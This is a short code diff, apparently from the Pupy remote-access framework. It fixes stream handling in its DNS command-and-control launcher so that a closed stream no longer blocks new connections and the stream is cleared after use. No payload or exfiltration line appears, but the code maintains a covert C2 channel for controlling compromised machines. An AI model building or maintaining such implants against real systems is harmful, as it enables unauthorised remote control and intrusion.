@@ -95,7 +95,7 @@ class DNSCommandClientLauncher(DnsCommandsClient):
     def on_connect(self, ip, port, transport, proxy=None):
         logging.debug('connect request: {}:{} {} {}'.format(ip, port, transport, proxy))
         with self.lock:
-            if self.stream:
+            if self.stream and not self.stream.closed:
                 logging.debug('ignoring connection request. stream = {}'.format(self.stream))
                 return
 
@@ -261,6 +261,11 @@ class DNSCncLauncher(BaseLauncher):
                 if stream:
                     logging.debug('stream created, yielding - {}'.format(stream))
                     pupy.infos['transport'] = command[3]
+
                     yield stream
+
+                    with dnscnc.lock:
+                        dnscnc.stream = None
+
                 else:
                     logging.debug('all connection attempt has been failed')
